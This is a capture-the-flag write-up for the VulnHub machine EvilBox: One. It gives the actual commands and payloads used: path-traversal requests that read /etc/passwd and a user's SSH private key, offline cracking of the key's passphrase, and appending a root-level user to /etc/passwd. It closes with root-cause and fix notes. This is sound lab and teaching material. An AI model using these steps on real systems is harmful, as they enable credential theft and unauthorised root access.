# EvilBox: One — Writeup

**Platform:** VulnHub
**Difficulty:** Easy
**Target IP:** 192.168.1.177

## Summary

EvilBox: One is beaten by chaining a directory/content fuzz to find a hidden
PHP endpoint, abusing that endpoint for Local File Inclusion (LFI) to read
`/etc/passwd` and the local user's SSH private key, cracking the key's
passphrase offline, using the recovered key to log in as a low-privilege
user, then escalating to root by appending a custom user entry to
`/etc/passwd` via a writable/misconfigured path.

## 1. Reconnaissance

An Nmap scan of the target showed two open ports:

- **22/tcp** — SSH
- **80/tcp** — HTTP

The web server's `robots.txt` hinted at a hidden path, which pointed toward
a `/secret/` directory.

## 2. Content Discovery

Gobuster was run against the web root and confirmed a `/secret/` directory.
Inside it sat an unusual file, `evil.php`, which became the focus of
further enumeration.

## 3. Parameter Fuzzing with ffuf

With the endpoint identified, the next question was what parameter it
accepted. `ffuf` was used to fuzz for a valid GET parameter name against
`evil.php`, filtering out empty (size 0) responses:

```bash
ffuf -u http://192.168.1.177/secret/evil.php?FUZZ=../../../../../../etc/passwd \
     -w /home/kali/Downloads/directory-list-2.3-medium.txt -fs 0
```

This returned a hit on the parameter **`command`** (HTTP 200, non-zero
response size), confirming the endpoint accepted user-controlled input.

## 4. Local File Inclusion (LFI)

With the parameter name known, the endpoint was queried directly:

```
http://192.168.1.177/secret/evil.php?command=../../../../etc/passwd
```

This returned the full contents of `/etc/passwd`, confirming classic path
traversal / LFI. The user listing revealed a non-system account:

```
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```

Since the LFI allowed arbitrary file reads, the next logical target was
that user's SSH private key:

```
http://192.168.1.177/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa
```

This returned a full **RSA private key**, encrypted with a passphrase
(`Proc-Type: 4,ENCRYPTED`).

## 5. Cracking the SSH Key Passphrase

The encrypted key was saved locally and converted to a crackable hash
format (`ssh2john`), then run through **John the Ripper** with the
`rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt
```

John recovered the passphrase almost instantly:

```
unicorn (id_rsa)
```

## 6. Initial Access

Using the decrypted private key and recovered passphrase, SSH access was
obtained as `mowree`. The user flag was retrieved:

```bash
cat user.txt
# 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
```

## 7. Privilege Escalation

Enumeration of the box turned up a path to write to `/etc/passwd` (either
via a misconfigured permission or a found write primitive). A new
root-equivalent user entry was appended directly to the file with a
pre-generated password hash:

```bash
echo 'tom:$6$DblKZZHVsNLfUAvm$gZQBgCv20rxbKPtgXAAA/91eTSpdgawajv9Ezac.GszI9QPGbf4bO8PFNS2.rXI3Y8H6eFDnsp3RMArt5QMxP0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Switching to the newly created UID-0 user granted an immediate root shell:

```bash
su tom
cd /root
cat root.txt
# 36QtXfdJWvdC0VavlPIApUbDlqTsBM
```

## Root Cause / Takeaways

- **Exposed debug/utility script** (`evil.php`) accepted a raw filename
  parameter with no sanitization → classic LFI/path traversal.
- **LFI → credential theft**: any file readable by the web server user
  (including another local user's `.ssh` directory) was exposed to a
  remote, unauthenticated attacker.
- **Weak key passphrase** (`unicorn`) made an otherwise-encrypted private
  key trivially crackable with a common wordlist.
- **Writable `/etc/passwd`** gave instant privilege escalation once any
  local write access was obtained — a very unforgiving misconfiguration.

### Fixes
- Never expose an endpoint that passes user input straight into a file
  read/include function; validate against an allow-list.
- Enforce strong, unique passphrases on private keys (or none — rely on
  `authorized_keys` restrictions instead).
- Lock down `/etc/passwd` permissions and audit for world-writable
  sensitive files.
